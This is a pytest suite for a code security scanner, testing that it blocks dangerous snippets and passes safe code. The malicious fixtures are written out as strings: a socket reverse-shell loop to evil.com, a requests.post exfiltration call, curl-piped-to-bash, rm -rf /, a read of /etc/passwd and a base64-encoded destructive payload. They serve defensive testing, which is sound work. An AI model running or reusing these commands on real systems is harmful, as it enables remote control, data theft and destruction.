"""
Tests for code security scanner.

Tests include:
- Blocking malicious code (file operations, network calls, command execution)
- Allowing safe code (pure functions, safe imports)
- Warning for risky patterns
- Complexity analysis
- Obfuscation detection
"""

import pytest

from app.services.code_security import (
    CodeSecurityScanner,
    IssueSeverity,
    IssueType,
    SecurityStatus,
)


@pytest.fixture
def scanner():
    """Create a code security scanner instance."""
    return CodeSecurityScanner()


# ============================================================================
# Tests for Blocking Malicious Code
# ============================================================================


class TestBlockMaliciousCode:
    """Tests for blocking dangerous code patterns."""

    def test_block_file_read(self, scanner):
        """Test blocking file read operations."""
        code = """
def read_secrets():
    with open('/etc/passwd', 'r') as f:
        return f.read()
"""
        result = scanner.scan_code(code)

        assert result.status == SecurityStatus.FAILED
        assert any(
            issue.issue_type == IssueType.BLOCKED_FUNCTION for issue in result.issues
        )
        assert any("open" in issue.message.lower() for issue in result.issues)

    def test_block_file_write(self, scanner):
        """Test blocking file write operations."""
        code = """
def write_malware():
    with open('/tmp/malware.sh', 'w') as f:
        f.write('#!/bin/bash\\nrm -rf /')
"""
        result = scanner.scan_code(code)

        assert result.status == SecurityStatus.FAILED
        assert any(
            issue.issue_type == IssueType.BLOCKED_FUNCTION for issue in result.issues
        )

    def test_block_subprocess(self, scanner):
        """Test blocking subprocess execution."""
        code = """
import subprocess

def execute_command():
    subprocess.run(['ls', '-la'])
"""
        result = scanner.scan_code(code)

        assert result.status == SecurityStatus.FAILED
        assert any(
            issue.issue_type == IssueType.BLOCKED_IMPORT for issue in result.issues
        )
        assert any("subprocess" in issue.message.lower() for issue in result.issues)

    def test_block_os_module(self, scanner):
        """Test blocking os module."""
        code = """
import os

def delete_files():
    os.system('rm -rf /')
"""
        result = scanner.scan_code(code)

        assert result.status == SecurityStatus.FAILED
        assert any(
            issue.issue_type == IssueType.BLOCKED_IMPORT for issue in result.issues
        )
        assert any("os" in issue.message.lower() for issue in result.issues)

    def test_block_eval(self, scanner):
        """Test blocking eval()."""
        code = """
def execute_user_input(user_code):
    return eval(user_code)
"""
        result = scanner.scan_code(code)

        assert result.status == SecurityStatus.FAILED
        assert any(
            issue.issue_type == IssueType.BLOCKED_FUNCTION for issue in result.issues
        )
        assert any("eval" in issue.message.lower() for issue in result.issues)

    def test_block_exec(self, scanner):
        """Test blocking exec()."""
        code = """
def execute_code(code_str):
    exec(code_str)
"""
        result = scanner.scan_code(code)

        assert result.status == SecurityStatus.FAILED
        assert any(
            issue.issue_type == IssueType.BLOCKED_FUNCTION for issue in result.issues
        )
        assert any("exec" in issue.message.lower() for issue in result.issues)

    def test_block_compile(self, scanner):
        """Test blocking compile()."""
        code = """
def compile_code(code_str):
    compiled = compile(code_str, '<string>', 'exec')
    exec(compiled)
"""
        result = scanner.scan_code(code)

        assert result.status == SecurityStatus.FAILED
        assert any(
            issue.issue_type == IssueType.BLOCKED_FUNCTION for issue in result.issues
        )

    def test_block_import_dunder(self, scanner):
        """Test blocking __import__()."""
        code = """
def dynamic_import(module_name):
    module = __import__(module_name)
    return module
"""
        result = scanner.scan_code(code)

        assert result.status == SecurityStatus.FAILED
        assert any(
            issue.issue_type in [IssueType.BLOCKED_FUNCTION, IssueType.DYNAMIC_IMPORT]
            for issue in result.issues
        )

    def test_block_network_socket(self, scanner):
        """Test blocking socket operations."""
        code = """
import socket

def create_backdoor():
    s = socket.socket()
    s.connect(('evil.com', 9999))
"""
        result = scanner.scan_code(code)

        assert result.status == SecurityStatus.FAILED
        assert any(
            issue.issue_type == IssueType.BLOCKED_IMPORT for issue in result.issues
        )
        assert any("socket" in issue.message.lower() for issue in result.issues)

    def test_block_requests(self, scanner):
        """Test blocking network requests."""
        code = """
import requests

def exfiltrate_data(data):
    requests.post('https://evil.com/steal', json=data)
"""
        result = scanner.scan_code(code)

        assert result.status == SecurityStatus.FAILED
        assert any(
            issue.issue_type == IssueType.BLOCKED_IMPORT for issue in result.issues
        )
        assert any("requests" in issue.message.lower() for issue in result.issues)

    def test_block_pickle(self, scanner):
        """Test blocking pickle (unsafe serialization)."""
        code = """
import pickle

def load_data(file_path):
    with open(file_path, 'rb') as f:
        return pickle.load(f)
"""
        result = scanner.scan_code(code)

        assert result.status == SecurityStatus.FAILED
        # Multiple issues: pickle import, open function
        assert len(result.issues) >= 2

    def test_block_multiple_issues(self, scanner):
        """Test code with multiple security issues."""
        code = """
import os
import subprocess
import socket

def super_malicious():
    os.system('curl evil.com/malware.sh | bash')
    subprocess.run(['rm', '-rf', '/'])
    eval('__import__("os").system("echo pwned")')
"""
        result = scanner.scan_code(code)

        assert result.status == SecurityStatus.FAILED
        assert len(result.issues) >= 4  # Multiple imports and function calls
        assert result.risk_score > 50  # Should have high risk score


# ============================================================================
# Tests for Allowing Safe Code
# ============================================================================


class TestAllowSafeCode:
    """Tests for allowing safe, legitimate code."""

    def test_allow_pure_function(self, scanner):
        """Test allowing pure mathematical functions."""
        code = """
def fibonacci(n):
    if n <= 1:
        return n
    return fibonacci(n-1) + fibonacci(n-2)
"""
        result = scanner.scan_code(code)

        # Should pass or have only warnings (complexity)
        assert result.status in [SecurityStatus.PASSED, SecurityStatus.WARNING]

    def test_allow_safe_imports(self, scanner):
        """Test allowing safe imports (math, json, datetime)."""
        code = """
import math
import json
from datetime import datetime, timedelta

def calculate_area(radius):
    return math.pi * radius ** 2

def serialize_data(data):
    return json.dumps(data)

def get_tomorrow():
    return datetime.now() + timedelta(days=1)
"""
        result = scanner.scan_code(code)

        assert result.status == SecurityStatus.PASSED
        assert not any(
            issue.severity in [IssueSeverity.CRITICAL, IssueSeverity.HIGH]
            for issue in result.issues
        )

    def test_allow_collections(self, scanner):
        """Test allowing collections module."""
        code = """
from collections import defaultdict, Counter

def count_words(text):
    words = text.split()
    return Counter(words)

def group_by_length(words):
    grouped = defaultdict(list)
    for word in words:
        grouped[len(word)].append(word)
    return dict(grouped)
"""
        result = scanner.scan_code(code)

        assert result.status == SecurityStatus.PASSED

    def test_allow_itertools(self, scanner):
        """Test allowing itertools module."""
        code = """
from itertools import combinations, permutations

def get_combinations(items, r):
    return list(combinations(items, r))
"""
        result = scanner.scan_code(code)

        assert result.status == SecurityStatus.PASSED

    def test_allow_typing(self, scanner):
        """Test allowing typing module."""
        code = """
from typing import List, Dict, Optional

def process_items(items: List[str]) -> Dict[str, int]:
    return {item: len(item) for item in items}
"""
        result = scanner.scan_code(code)

        assert result.status == SecurityStatus.PASSED

    def test_allow_dataclasses(self, scanner):
        """Test allowing dataclasses."""
        code = """
from dataclasses import dataclass

@dataclass
class Point:
    x: float
    y: float

    def distance_from_origin(self):
        return (self.x ** 2 + self.y ** 2) ** 0.5
"""
        result = scanner.scan_code(code)

        assert result.status == SecurityStatus.PASSED

    def test_allow_regex(self, scanner):
        """Test allowing regex operations."""
        code = """
import re

def extract_emails(text):
    pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}'
    return re.findall(pattern, text)
"""
        result = scanner.scan_code(code)

        assert result.status == SecurityStatus.PASSED


# ============================================================================
# Tests for Warning on Risky Patterns
# ============================================================================


class TestWarnRiskyPatterns:
    """Tests for warning on risky but not necessarily dangerous patterns."""

    def test_warn_global_variables(self, scanner):
        """Test warning for global variables."""
        code = """
global_counter = 0

def increment():
    global global_counter
    global_counter += 1
"""
        result = scanner.scan_code(code)

        assert result.status == SecurityStatus.WARNING
        assert any(
            issue.issue_type == IssueType.GLOBAL_VARIABLE for issue in result.issues
        )

    def test_warn_high_complexity(self, scanner):
        """Test warning for high complexity."""
        code = """
def complex_function(x, y, z):
    if x > 0:
        if y > 0:
            if z > 0:
                if x > y:
                    if y > z:
                        if x > z:
                            return 1
                        else:
                            return 2
                    else:
                        return 3
                else:
                    return 4
            else:
                return 5
        else:
            return 6
    else:
        return 7
"""
        result = scanner.scan_code(code)

        assert result.status == SecurityStatus.WARNING
        assert any(
            issue.issue_type in [IssueType.HIGH_COMPLEXITY, IssueType.DEEP_NESTING]
            for issue in result.issues
        )

    def test_warn_deep_nesting(self, scanner):
        """Test warning for deep nesting."""
        code = """
def deeply_nested(data):
    for item in data:
        if item:
            for sub_item in item:
                if sub_item:
                    for value in sub_item:
                        if value:
                            for element in value:
                                print(element)
"""
        result = scanner.scan_code(code)

        assert result.status == SecurityStatus.WARNING
        assert any(
            issue.issue_type == IssueType.DEEP_NESTING for issue in result.issues
        )

    def test_warn_risky_imports(self, scanner):
        """Test warning for risky imports (random, hashlib)."""
        code = """
import random

def generate_token():
    # Not cryptographically secure!
    return ''.join(random.choices('0123456789abcdef', k=32))
"""
        result = scanner.scan_code(code)

        # Should have warning about random import
        assert any(
            "random" in issue.message.lower() and issue.severity == IssueSeverity.MEDIUM
            for issue in result.issues
        )


# ============================================================================
# Tests for Obfuscation Detection
# ============================================================================


class TestObfuscationDetection:
    """Tests for detecting obfuscated code."""

    def test_detect_base64_obfuscation(self, scanner):
        """Test detecting base64 obfuscation."""
        code = """
import base64

def decode_payload():
    payload = b'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oInJtIC1yZiAvIik='
    return base64.b64decode(payload)
"""
        result = scanner.scan_code(code)

        assert result.status == SecurityStatus.FAILED
        assert any(issue.issue_type == IssueType.OBFUSCATION for issue in result.issues)

    def test_detect_hex_obfuscation(self, scanner):
        """Test detecting hex escape sequences."""
        code = r"""
def obfuscated():
    x = '\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21'
    return x
"""
        result = scanner.scan_code(code)

        assert any(issue.issue_type == IssueType.OBFUSCATION for issue in result.issues)

    def test_detect_chr_pattern(self, scanner):
        """Test detecting chr() patterns (common in obfuscation)."""
        code = """
def obfuscated():
    return chr(72) + chr(101) + chr(108) + chr(108) + chr(111)
"""
        result = scanner.scan_code(code)

        # chr is not in blocked functions, but might be detected in obfuscation
        # This is a legitimate use case, so we don't strictly require obfuscation detection


# ============================================================================
# Tests for Complexity Analysis
# ============================================================================


class TestComplexityAnalysis:
    """Tests for complexity analysis."""

    def test_complexity_metrics(self, scanner):
        """Test complexity metrics calculation."""
        code = """
def simple_function(x):
    return x * 2

def moderate_function(x, y):
    if x > 0:
        return y
    else:
        return x

def complex_function(a, b, c):
    if a > 0:
        if b > 0:
            if c > 0:
                return 1
            else:
                return 2
        else:
            return 3
    else:
        return 4
"""
        result = scanner.scan_code(code)

        assert "average_complexity" in result.complexity_metrics
        assert "max_complexity" in result.complexity_metrics
        assert "total_functions" in result.complexity_metrics
        assert result.complexity_metrics["total_functions"] == 3

    def test_maintainability_index(self, scanner):
        """Test maintainability index calculation."""
        code = """
def well_structured_function(items):
    '''Process items efficiently.'''
    result = []
    for item in items:
        if item:
            result.append(item.strip())
    return result
"""
        result = scanner.scan_code(code)

        assert "maintainability_index" in result.complexity_metrics


# ============================================================================
# Tests for Syntax Validation
# ============================================================================


class TestSyntaxValidation:
    """Tests for syntax validation."""

    def test_invalid_syntax(self, scanner):
        """Test detecting syntax errors."""
        code = """
def broken_function():
    if True
        return 1
"""
        result = scanner.scan_code(code)

        assert result.status == SecurityStatus.FAILED
        assert any(
            issue.issue_type == IssueType.SYNTAX_ERROR for issue in result.issues
        )

    def test_valid_syntax(self, scanner):
        """Test accepting valid syntax."""
        code = """
def valid_function():
    return 42
"""
        result = scanner.scan_code(code)

        # Should not have syntax errors
        assert not any(
            issue.issue_type == IssueType.SYNTAX_ERROR for issue in result.issues
        )


# ============================================================================
# Tests for Verified Package Bypass
# ============================================================================


class TestVerifiedPackages:
    """Tests for verified package bypass."""

    def test_verified_bypasses_import_checks(self, scanner):
        """Test that verified packages bypass some import checks."""
        code = """
import random

def generate_number():
    return random.randint(1, 100)
"""
        # Regular scan - should have warning
        regular_result = scanner.scan_code(code, verified=False)
        assert any("random" in issue.message.lower() for issue in regular_result.issues)

        # Verified scan - should bypass warning
        verified_result = scanner.scan_code(code, verified=True)
        # Verified still checks syntax and complexity, but not imports
        assert verified_result.status in [SecurityStatus.PASSED, SecurityStatus.WARNING]

    def test_verified_still_checks_syntax(self, scanner):
        """Test that verified packages still check syntax."""
        code = """
def broken():
    if True
        return 1
"""
        result = scanner.scan_code(code, verified=True)

        assert result.status == SecurityStatus.FAILED
        assert any(
            issue.issue_type == IssueType.SYNTAX_ERROR for issue in result.issues
        )


# ============================================================================
# Tests for Risk Score Calculation
# ============================================================================


class TestRiskScore:
    """Tests for risk score calculation."""

    def test_safe_code_low_score(self, scanner):
        """Test that safe code has low risk score."""
        code = """
def add(a, b):
    return a + b
"""
        result = scanner.scan_code(code)

        assert result.risk_score < 10

    def test_malicious_code_high_score(self, scanner):
        """Test that malicious code has high risk score."""
        code = """
import os
import subprocess

def bad_function():
    os.system('rm -rf /')
    subprocess.run(['curl', 'evil.com'])
    eval('malicious code')
"""
        result = scanner.scan_code(code)

        assert result.risk_score > 50

    def test_warning_code_medium_score(self, scanner):
        """Test that code with warnings has medium risk score."""
        code = """
global_var = 0

def moderate_function():
    global global_var
    global_var += 1
"""
        result = scanner.scan_code(code)

        assert 0 < result.risk_score < 50


# ============================================================================
# Tests for Recommendations
# ============================================================================


class TestRecommendations:
    """Tests for recommendation generation."""

    def test_recommendations_for_malicious_code(self, scanner):
        """Test recommendations for malicious code."""
        code = """
import os

def bad():
    os.system('ls')
"""
        result = scanner.scan_code(code)

        assert len(result.recommendations) > 0
        assert any(
            "cannot be published" in rec.lower() for rec in result.recommendations
        )

    def test_recommendations_for_safe_code(self, scanner):
        """Test recommendations for safe code."""
        code = """
def add(a, b):
    return a + b
"""
        result = scanner.scan_code(code)

        assert len(result.recommendations) > 0
        assert any("passed" in rec.lower() for rec in result.recommendations)


# ============================================================================
# Integration Tests
# ============================================================================


class TestIntegration:
    """Integration tests for complete scanning workflows."""

    def test_complete_scan_malicious(self, scanner):
        """Test complete scan of malicious code."""
        code = """
import subprocess
import socket

def backdoor():
    s = socket.socket()
    s.connect(('evil.com', 4444))
    while True:
        cmd = s.recv(1024).decode()
        output = subprocess.check_output(cmd, shell=True)
        s.send(output)
"""
        result = scanner.scan_code(code)

        assert result.status == SecurityStatus.FAILED
        assert result.risk_score > 50
        assert len(result.issues) >= 3
        assert len(result.recommendations) > 0
        assert result.scanned_at is not None

    def test_complete_scan_safe(self, scanner):
        """Test complete scan of safe code."""
        code = """
from typing import List
from collections import Counter

def analyze_text(text: str) -> dict:
    '''Analyze text and return statistics.'''
    words = text.lower().split()

    return {
        'word_count': len(words),
        'unique_words': len(set(words)),
        'most_common': Counter(words).most_common(5)
    }
"""
        result = scanner.scan_code(code)

        assert result.status == SecurityStatus.PASSED
        assert result.risk_score < 20
        assert result.scanned_at is not None
        assert "passed" in result.recommendations[0].lower()

    def test_complete_scan_with_warnings(self, scanner):
        """Test complete scan of code with warnings."""
        code = """
import random

count = 0

def complex_function(x, y, z):
    global count
    count += 1

    if x > 0:
        if y > 0:
            if z > 0:
                if x > y:
                    if y > z:
                        return random.randint(1, 100)
    return 0
"""
        result = scanner.scan_code(code)

        assert result.status == SecurityStatus.WARNING
        assert 10 < result.risk_score < 50
        assert any(issue.severity == IssueSeverity.MEDIUM for issue in result.issues)
        assert "warning" in result.recommendations[0].lower()
